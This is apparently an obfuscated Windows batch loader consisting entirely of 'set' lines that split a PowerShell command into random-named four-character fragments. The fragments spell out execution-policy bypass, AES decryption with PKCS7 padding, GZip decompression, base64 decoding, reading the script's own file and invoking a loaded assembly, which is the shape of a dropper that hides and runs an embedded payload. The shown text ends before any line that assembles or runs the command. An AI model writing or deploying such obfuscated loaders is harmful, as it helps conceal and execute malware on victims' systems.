@echo off
set "WhViArKGWR=oryS"
set "oTHpRUrImA=tn ="
set "ZbiWxdRygc=ecry"
set "YJpkHtQacQ=; };"
set "szpBOroCiu=shNr"
set "VPcGGxLZaA=yste"
set "rLgTIBmPnD=sion"
set "WBxUhUiqlP=ress"
set "jYCgGvyNnc=[Sys"
set "NlbNmCNbvO=shNr"
set "rtCgTqlMvq=n ''"
set "SIawlDGszS=.Com"
set "JiZbrEmBBm=tem."
set "pcjLngmHLk=BCgt"
set "hmSgfJAdVs=comm"
set "jfHZhiFPXi=Syst"
set "mKtIsYgqyr=ring"
set "dxIJnsSZBa=DsZt"
set "LRuZTfInMx=VdvW"
set "mYcclyONpq=Comp"
set "oKyhLgVxNH=.Mod"
set "wfxyfIdWgV=ptog"
set "mbvicYeANM=);$t"
set "eMFmsRJHcY= '')"
set "gjPrjFqXst=bypa"
set "ZSjfFOqNAj=();$"
set "VqqwAAMpCM=AYm "
set "PrWIuKjxPJ=am;$"
set "drTGOkJKBr=lwhc"
set "pREdliwiKa=urit"
set "ntrjfUKuLR=tem."
set "gXNejLBfpb=TllA"
set "JvNZpajoWk='[-1"
set "rHWZPfmGUS=stem"
set "UcOdaBSdUj=.Cre"
set "uQNWhxUCsR=Secu"
set "kTqKIrrRhN=zHhH"
set "PPXJGORiwq=yste"
set "IwbxRUbKGS=1..-"
set "TBCIbAcTNG=grap"
set "bGbgWGZxfi=nirt"
set "ncyqoFdBtt= = ["
set "owTABvdJNY=shNr"
set "hFwbkCYkpk=ress"
set "kCdSXOSybR=();$"
set "MYOvjctmSE=).Sp"
set "KIAxjMweRi=ress"
set "BWziFqIEMJ= [st"
set "rBoaXwNIQV=PKCS"
set "JeVUZcqRby=hy.A"
set "LnHYoSiYiL=S46e"
set "ymnJHWIjBm=ew-O"
set "RnFmJEnUZm=ypto"
set "QvXdGaNybw=rtS4"
set "lKfxfsqhSq=pose"
set "TJUSiFVqkP=rans"
set "yyMeXjRAtx=ect "
set "kfFzAZmFQi=Mode"
set "ZlIHTBWbUh=e = "
set "PRGvHdoCgx=ke($"
set "COMnYhyYqu= [Sy"
set "VhdDfAFYXz=ment"
set "NQXLOadDkn=.Ass"
set "ziKubEPlHD=tryP"
set "mjQGxNdhXx=  $t"
set "cZxmMbOpFd=tion"
set "tdwylGAVXd===')"
set "OFbOLULAIi=($Vd"
set "OpDTeZczzU=Invo"
set "dbSpGoGHGC=)($B"
set "nnicVkmvhq=New-"
set "djOOPyGCjV=[]] "
set "YNrvvAjfes=$Bsh"
set "iiJtoaLomj=gMod"
set "hAQDuBstDU=ss -"
set "ESjUgmprEi=uVb."
set "AbffCtEUQc=oArr"
set "PDzAQWIWrw=;$Kw"
set "gFzbpXlYQf=yK, "
set "calrAauVKz=Kwuy"
set "dlVBmsyIBC=$omQ"
set "KIZrqMnZFO=m(, "
set "XzBHTBtqKU=);$P"
set "WTDfclhyNI=-4] "
set "bAPMnQbjyZ=Disp"
set "FaYMFBJZLf=th('"
set "bXkHPZPuaX=]::N"
set "OvVCKoxMBD=('%~f0'"
set "LxaWllEKWs=raph"
set "bmpgYHqdbm=.Con"
set "kSCseXJGFp=.IO."
set "URXibVyyYa=X = "
set "xGvprutqEs=stem"
set "pwcTOKuAEL=em.I"
set "HJRoLpGkyc=Nr.I"
set "wEGrobEYjl=onve"
set "fZiEkJZzlf=orF'"
set "NOmrMMiCYW=K.Su"
set "zHsANgChOJ=eam("
set "eqgbzuXCLo=)))"
set "dqsljvGtie=tX ="
set "aNoKOgCiee=comp"
set "VMWQMsvudF=l5E7"
set "QTXvtEaprM=::('"
set "SWWivDvbtU=shNr"
set "gIpDGlzNWe=Obje"
set "pKxKEBIqni=ONwx"
set "JyqmAJqtUn=);$B"
set "QOiYOoHxgb=brea"
set "cSzNDDlKSj=16] "
set "YiVfdsaJhH=gsYZ"
set "OazAShoBqx=gth)"
set "UDqIuxSgTh=ion."
set "JjzaIIOoex=$BCg"
set "AkeqcLedNE=] -j"
set "YvwtdknezY=ct S"
set "VqXLmFhlxI=m.En"
set "OenUNXUnxV=]::("
set "MnjmlxJdTX=Bmor"
set "ZEkmyiCelb='')("
set "VQiGraMaXi=ewLi"
set "ZdgihDOtui=t = "
set "nhwJpcBUFD=..-1"
set "XhodilnFgB=6esa"
set "SINcVnlRgL=oin "
set "RuIbJYqgUe= = $"
set "IXTgfDAlwf=PmAY"
set "MurxYfEHEg=daeR"
set "rMecaZKBYr=r.Pa"
set "vdDTyNExqF=tsWi"
set "puAaqxHeFg=ay()"
set "CjygTWksHH=qAmj"
set "vqqEBAYZKD=.Cop"
set "rRfWJIFLUW=$Kwu"
set "nPiLthRydc=K = "
set "jOhwYnPFvc=.GZi"
set "XBsEPtjoVu=le  "
set "YLZZZeDgwp=rofi"
set "qXwesjecnB=.-16"
set "bEzlobzxph=.Cry"
set "mRCYSufOsP=saBm"
set "AHodgyNsMo=BC;$"
set "Xxmkvdkbuj=ddin"
set "mgVRLdeVUU=zuZI"
set "hYYQjYvHeE=Conv"
set "lNxwcTuQeD=('da"
set "gubVfldTzI=::De"
set "UucjWWGeoa= if "
set "iQjIDSneuZ=gjYA"
set "wXnSMKOznN=ing("
set "EjBwYNrLnG=d;$B"
set "cLXtorAOBY=-nop"
set "XcjLtGcFTb=$BCg"
set "FWmJEETqIf='0Pg"
set "bqOPdqyFpq='gni"
set "TANEiReXeT=tDsZ"
set "IOlXPowxjx=.Len"
set "tLuVsVfxmk=;$Dd"
set "bBptxyYYjc=, $B"
set "tqrGpZHcay=trea"
set "iHzzSleQoh=rity"
set "hjNINxdIKO=oL'["
set "bWeHVDQCsc=ddin"
set "EtKdyQGhld=vWK."
set "TaTlZfLVCb=raph"
set "jQYKawVdTO=]::("
set "xNiTjVlUef=pres"
set "HykLNlgvqv=('Tg"
set "bFUOYznkVb=Disp"
set "zQFGuLDBJn=RmAx"
set "CzrqmbIvFm== [S"
set "YmWCCWaSRU=eMVs"
set "ghJqhYzvJJ=ode]"
set "IEVNWcjXJC=BCgt"
set "ulgeSGTJwS=.Key"
set "oXGjUdirpW=3); "
set "wOXwiiJqBj=1] -"
set "asqBDioIKe=-Obj"
set "ekNHLHlNnB=;$Dd"
set "qkfgpMkEuc=vWK "
set "DrlRKwWZak=n) {"
set "LAfNszJHWK=[Sys"
set "OcUDZmijmj=Star"
set "DAQgjJhKHp=ert]"
set "JZIpPWKQGB=hc);"
set "UKBsTqncjB=7;$B"
set "wlBxUouWhh= '')"
set "yRsAhksgYu=BshN"
set "IdBYeRROZL=.Mem"
set "PBDVZbOTWw=join"
set "inKHjXMMrv=pher"
set "MZrJrQWJoY=V = "
set "qFVckiyXDU=CgtX"
set "STXFHcNlHa=Secu"
set "lFPtkplQjE=Syst"
set "ZwPTgGnaLT=();$"
set "fmcZCQEtuG= [Sy"
set "ayrfPULqtv=mory"
set "bjDjJRWQIK=]::C"
set "GcooXuJbwI=.Dis"
set "RrWxjOMbuj=and "
set "QBpcoSCzfp=ptog"
set "ZePkzlTtnn=$tDs"
set "crNZnIjtif=s75K"
set "nhXOKZAbnq=YxVw"
set "YBwNgZddAP=m.Re"
set "fQSbVaeMJF=dj0C"
set "iSZWALbVNU=in $"
